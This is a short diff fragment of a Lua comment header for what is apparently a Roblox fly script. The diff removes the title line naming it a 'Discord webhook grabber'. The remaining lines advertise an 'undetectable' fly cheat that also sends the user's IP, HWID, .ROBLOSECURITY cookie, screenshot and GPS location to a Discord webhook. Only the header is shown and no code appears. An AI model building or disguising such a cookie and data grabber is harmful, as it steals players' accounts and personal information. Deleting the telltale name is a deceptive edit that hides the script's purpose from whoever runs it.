@@ -1,5 +1,4 @@
 --[[
-    FLY GUI + DISCORD WEBHOOK GRABBER v11
     - Undetectable fly (E to toggle)
     - Sends IP, HWID, .ROBLOSECURITY, screenshot, GPS, RAP, etc.
     - Rich Discord embed with map link + avatar + spoilers
